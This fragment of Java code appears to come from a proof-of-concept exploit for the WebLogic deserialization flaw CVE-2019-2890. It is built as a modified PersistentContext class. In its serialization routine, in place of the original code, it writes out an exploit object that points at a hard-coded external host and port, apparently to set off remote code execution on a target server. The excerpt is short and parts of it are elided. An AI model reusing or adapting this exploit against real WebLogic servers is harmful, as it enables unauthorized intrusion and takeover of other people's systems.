...
import com.weblogcVul.CVE_2019_2890;
...
//        }
        try{
            var3.writeObject(CVE_2019_2890.getObject("120.77.180.97:8000"));
        } catch (Exception e) {
            e.printStackTrace();
        }
        var3.flush();
...
//        }
        var5 = EncryptionUtil.getEncryptionService().encryptBytes(var5);
    ...
    public PersistentContext(@NotNull String var1, @NotNull Map<String, Serializable> var2, @NotNull Set<String> var3, @Nullable Map<String, Serializable> var4, @NotNull Map<String, Serializable> var5) {
        super(var1);
